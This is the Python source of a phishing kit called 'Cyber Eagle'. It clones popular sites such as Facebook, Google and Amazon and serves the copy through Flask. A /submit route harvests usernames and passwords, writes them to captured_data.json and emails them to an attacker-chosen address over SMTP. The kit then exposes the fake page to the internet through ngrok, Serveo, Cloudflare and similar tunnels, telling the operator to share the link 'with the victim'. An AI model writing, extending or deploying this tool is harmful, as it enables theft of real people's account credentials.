import os
import requests
from flask import Flask, request, render_template_string
from colorama import Fore, Style, init
from datetime import datetime
import json
import smtplib
from email.mime.text import MIMEText
from bs4 import BeautifulSoup
import subprocess
import time
import shutil
import sys

# Initialize colorama
init(autoreset=True)

# Pre-defined list of websites for cloning
WEBSITES = {
    "1": "https://example.com",
    "2": "https://www.wikipedia.org",
    "3": "https://www.github.com",
    "4": "https://www.google.com",
    "5": "https://www.amazon.com",
    "6": "https://www.facebook.com",
    "7": "https://www.twitter.com",
    "8": "https://www.instagram.com",
    "9": "https://www.linkedin.com",
    "10": "https://www.reddit.com",
    "11": "https://www.netflix.com",
    "12": "https://www.youtube.com",
    "13": "https://www.ebay.com",
    "14": "https://www.cnn.com",
    "15": "https://www.bbc.com",
    "16": "https://www.nytimes.com",
    "17": "https://www.stackoverflow.com",
    "18": "https://www.microsoft.com",
    "19": "https://www.apple.com",
    "20": "https://www.dropbox.com",
    "21": "https://www.slack.com",
    "22": "https://www.trello.com",
    "23": "https://www.medium.com",
    "24": "https://www.quora.com",
    "25": "https://www.pinterest.com",
}

# CyberEagle Title in Big Font
CYBEREAGLE_TITLE = f"""
{Fore.CYAN}
         CYBER EAGLE
{Style.RESET_ALL}
"""

# Email configuration (for notifications)
EMAIL_HOST = "smtp.gmail.com"
EMAIL_PORT = 587
EMAIL_USER = "your_email@gmail.com"
EMAIL_PASS = "your_email_password"
EMAIL_RECEIVER = "receiver_email@gmail.com"

# Function to clear the phishing_page directory
def clear_phishing_page_directory(output_dir):
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    os.makedirs(output_dir)

# Step 1: Clone a Website (with assets and footer)
def clone_website(url, output_dir):
    try:
        # Clear the phishing_page directory
        clear_phishing_page_directory(output_dir)
        
        # Fetch the website content
        response = requests.get(url)
        if response.status_code == 200:
            # Parse the HTML content
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Download and replace assets (CSS, JS, images)
            for tag in soup.find_all(["link", "script", "img"]):
                if tag.get("href"):
                    asset_url = tag["href"]
                    if not asset_url.startswith("http"):
                        asset_url = requests.compat.urljoin(url, asset_url)
                    asset_name = os.path.basename(asset_url)
                    asset_path = os.path.join(output_dir, asset_name)
                    with open(asset_path, "wb") as asset_file:
                        asset_file.write(requests.get(asset_url).content)
                    tag["href"] = asset_name
                elif tag.get("src"):
                    asset_url = tag["src"]
                    if not asset_url.startswith("http"):
                        asset_url = requests.compat.urljoin(url, asset_url)
                    asset_name = os.path.basename(asset_url)
                    asset_path = os.path.join(output_dir, asset_name)
                    with open(asset_path, "wb") as asset_file:
                        asset_file.write(requests.get(asset_url).content)
                    tag["src"] = asset_name
            
            # Add a footer to the website
            footer = soup.new_tag("footer", style="text-align: center; padding: 10px; background-color: #f1f1f1;")
            footer.string = "Created By Cyber Eagle"
            soup.body.append(footer)
            
            # Save the modified HTML content to a file
            output_file = os.path.join(output_dir, "index.html")
            with open(output_file, "w", encoding="utf-8") as file:
                file.write(str(soup))
            print(f"Website cloned successfully to {output_file}")
        else:
            print(f"Failed to fetch website. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Step 2: Set Up Flask App
app = Flask(__name__)

# Function to log captured data in JSON format
def log_data(username, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = {
        "timestamp": timestamp,
        "username": username,
        "password": password,
    }
    with open("captured_data.json", "a") as file:
        file.write(json.dumps(data) + "\n")

# Function to send email notifications
def send_email(username, password):
    subject = "New Credentials Captured"
    body = f"Username: {username}\nPassword: {password}"
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = EMAIL_USER
    msg["To"] = EMAIL_RECEIVER

    try:
        with smtplib.SMTP(EMAIL_HOST, EMAIL_PORT) as server:
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASS)
            server.sendmail(EMAIL_USER, EMAIL_RECEIVER, msg.as_string())
        print("Email notification sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Home Route - Serve Cloned Website
@app.route("/")
def home():
    with open("phishing_page/index.html", "r", encoding="utf-8") as file:
        cloned_page = file.read()
    return cloned_page

# Simulate Data Capture, Store Data, and Send Email
@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Log the captured data
    log_data(username, password)
    
    # Send email notification
    send_email(username, password)
    
    # Display captured credentials in the terminal
    print(f"\n{Fore.GREEN}Captured Credentials:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Username:{Style.RESET_ALL} {username}")
    print(f"{Fore.YELLOW}Password:{Style.RESET_ALL} {password}")
    
    return """
    <h1>Login Successful</h1>
    <p>Thank you for logging in.</p>
    """

# Function to check if a tool is installed
def is_tool_installed(tool_name):
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except FileNotFoundError:
        return False
    except subprocess.CalledProcessError:
        return False

# Function to start a free server and generate a link
def start_free_server(server_choice, port):
    if server_choice == "1":
        # Localhost
        print(f"Running on localhost: http://localhost:{port}")
        app.run(port=port)
    elif server_choice == "2":
        # Ngrok
        if not is_tool_installed("ngrok"):
            print("Error: 'ngrok' is not installed. Please install it from https://ngrok.com/download.")
            return
        print("Starting Ngrok...")
        ngrok_process = subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)  # Wait for Ngrok to initialize
        print("Ngrok is running. Share the following link with the victim:")
        subprocess.run(["curl", "http://localhost:4040/api/tunnels"], stdout=subprocess.PIPE)
    elif server_choice == "3":
        # LocalTunnel
        if not is_tool_installed("lt"):
            print("Error: 'localtunnel' is not installed. Please install it using 'npm install -g localtunnel'.")
            return
        print("Starting LocalTunnel...")
        lt_process = subprocess.Popen(["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)  # Wait for LocalTunnel to initialize
        print("LocalTunnel is running. Share the following link with the victim:")
        for line in lt_process.stdout:
            if "your url is:" in line.decode():
                print(line.decode().strip())
                break
    elif server_choice == "4":
        # PageKite
        if not is_tool_installed("pagekite.py"):
            print("Error: 'pagekite' is not installed. Please install it using 'pip install pagekite'.")
            return
        print("Starting PageKite...")
        subprocess.run(["pagekite.py", str(port), "yourpagekite.pagekite.me"])
    elif server_choice == "5":
        # Serveo
        print("Starting Serveo...")
        subprocess.run(["ssh", "-R", "80:localhost:" + str(port), "serveo.net"])
    elif server_choice == "6":
        # LocalXpose
        if not is_tool_installed("loclx"):
            print("Error: 'localxpose' is not installed. Please install it from https://localxpose.io/download.")
            return
        print("Starting LocalXpose...")
        subprocess.run(["loclx", "http", "tunnel", "--to", str(port)])
    elif server_choice == "7":
        # Cloudflare Tunnel
        if not is_tool_installed("cloudflared"):
            print("Error: 'cloudflared' is not installed. Please install it from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation.")
            return
        print("Starting Cloudflare Tunnel...")
        try:
            subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:" + str(port)], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error running cloudflared: {e}")
    else:
        print("Invalid choice. Exiting.")
        return

# Main Function to Run the Tool
def main():
    # Display the CyberEagle title
    print(CYBEREAGLE_TITLE)

    # Display the list of pre-defined websites
    print("Select a website to clone:")
    for key, value in WEBSITES.items():
        print(f"{key}. {value}")

    # Get user input for website selection
    choice = input("Enter the number of the website you want to clone: ")
    if choice in WEBSITES:
        target_url = WEBSITES[choice]
        print(f"Cloning website: {target_url}")
        clone_website(target_url, "phishing_page")
    else:
        print("Invalid choice. Exiting.")
        return

    # Server selection
    print("\nSelect a server to run the tool:")
    print("1. Localhost (http://localhost:5000)")
    print("2. Ngrok (https://<your-subdomain>.ngrok.io)")
    print("3. LocalTunnel (https://<your-subdomain>.loca.lt)")
    print("4. PageKite (https://<your-subdomain>.pagekite.me)")
    print("5. Serveo (https://<your-subdomain>.serveo.net)")
    print("6. LocalXpose (https://<your-subdomain>.loclx.io)")
    print("7. Cloudflare Tunnel (https://<your-subdomain>.trycloudflare.com)")
    server_choice = input("Enter the number of your choice: ")

    # Start the selected server
    start_free_server(server_choice, port=5000)

if __name__ == "__main__":
    main()
